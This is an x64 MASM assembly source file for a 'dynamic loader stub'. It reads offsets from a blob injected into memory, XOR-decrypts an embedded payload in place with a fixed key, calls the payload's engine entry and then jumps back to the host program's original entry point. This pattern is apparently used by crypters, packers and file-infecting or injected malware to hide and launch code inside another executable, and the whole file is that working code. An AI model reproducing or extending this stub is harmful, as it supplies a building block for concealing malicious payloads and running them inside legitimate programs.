; engine_entry.asm - dynamic loader stub

.data
PUBLIC stub_length
stub_length QWORD stub_end - stub_entry ; Length of the stub in bytes

.code
PUBLIC stub_entry
PUBLIC stub_end
EXTERN ExitProcess:PROC

stub_entry LABEL BYTE  ; Symbol for C start pointer

_start:      ; <-- Needed for stub size computation
    ; rcx = base address of blob injected into memory

    ; Load payload location, size, and OEP from known offsets

    ;int 3 ; Debug breakpoint

    mov rbx, [rcx + 0FE0h]      ; offset of encrypted payload
    lea rdx, [rcx + rbx]        ; rdx = pointer to encrypted payload

    mov r8, [rcx + 0FE8h]       ; payload size in bytes
    mov r9d, 5Ah                ; XOR key

; --- Decryption loop ---
decrypt_loop:
    test r8, r8
    je decrypted
    mov al, [rdx]
    xor al, r9b
    mov [rdx], al
    inc rdx
    dec r8
    jmp decrypt_loop

; --- Call engine ---
decrypted:
    int 3 ; Debug breakpoint
    sub rsp, 40h            ; shadow stack for x64 ABI (32 bytes shadow space + 8 bytes for alignment + 8 bytes for return address)

    mov rax, [rcx + 0FF8h]  ; read offset to engine_entry
    add rax, rcx            ; rax = VA of engine_entry
    call rax                ; call engine_entry() 

    add rsp, 40h
    int 3

; --- Jump back to original entry point ---
    ;int 3 ; Debug breakpoint
    mov rax, [rcx + 0FF0h]
    jmp rax

    ;db 0CCh       ; Ensure a byte exists after final instruction to mitigate the MASM optimizer and relocations
    nop

dummy_fn:                   ; just to force stub_end to be separate (linker issues)
    ret
    
stub_end LABEL BYTE           ; Symbol for C end pointer
END

